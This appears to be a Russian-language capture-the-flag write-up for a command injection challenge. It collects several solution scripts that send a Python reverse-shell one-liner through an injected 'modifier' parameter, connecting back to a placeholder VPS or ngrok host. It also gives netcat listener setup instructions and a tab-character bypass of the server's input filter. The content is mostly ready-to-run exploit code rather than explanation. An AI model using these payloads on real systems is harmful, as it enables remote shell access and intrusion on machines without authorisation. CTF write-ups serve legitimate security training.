# Таск на Command Injection. Здесь собраны несколько решений других людей, самое прикольно это reverse shell

## Исходники [server](server.py) [admink-bot](admin.py)

#1 Reverse shell через vps

################################
```
from requests import post

url = "http://chal.competitivecyber.club:13336/"

# Замените на IP вашего VPS и нужный порт
vps_ip = "YOUR_VPS_IP"
vps_port = "4444"  # Порт, на котором слушает ваш VPS

payload = {
    "path": f"api/cal?modifier=-1;python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"{vps_ip}\", {vps_port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); import pty; pty.spawn(\"sh\")'"
}

res = post(f'{url}/visit', data=payload)
print(res.text)
````
$#############################
Настройка VPS для получения обратного shell
Откройте порт на вашем VPS: Убедитесь, что на вашем VPS открыт порт, который будет использоваться для соединения. Например, если вы планируете использовать порт 4444, вам нужно настроить брандмауэр (iptables) и, возможно, настройки вашего VPS-провайдера, чтобы разрешить входящие соединения на этот порт.

Запустите слушатель на вашем VPS: На вашем VPS откройте терминал и выполните команду для создания слушателя. Это можно сделать с помощью netcat (nc):

nc -lvnp 4444

Это позволит вашему VPS принимать входящие соединения на порту 4444.

Измените ваш payload: В вашем коде замените ngrok URL и порт на IP-адрес вашего VPS и порт, который вы открыли:



##################
```
from requests import post

url = "http://chal.competitivecyber.club:13336/"

# Здесь используйте ваш ngrok URL и порт
ngrok_url = "ngrok_tcp_url_here"
ngrok_port = "ngrok_tcp_port_here"

payload = {
    "path": f"api/cal?modifier=-1;python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"{ngrok_url}\", {ngrok_port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); import pty; pty.spawn(\"sh\")'"
}

res = post(f'{url}/visit', data=payload)
print(res.text)
```

####################
ЧЕрез ngrook
Убедитесь, что ваш ngrok запущен и доступен.
Следите за тем, чтобы не было символов, которые сервер может интерпретировать как недопустимые (например, ;), или модификатор, который не разрешён.

#Original solution
###########
```
from requests import *

url = "http://chal.competitivecyber.club:13336/"

res = post(f'{url}/visit', data={"path":f"api/ca\tl?modifier=-1;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ngrok tcp url here",ngrok tcp port here));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"})
print(res.text)
````
#######################
#2 Command Injection
In [solution](solution.py)
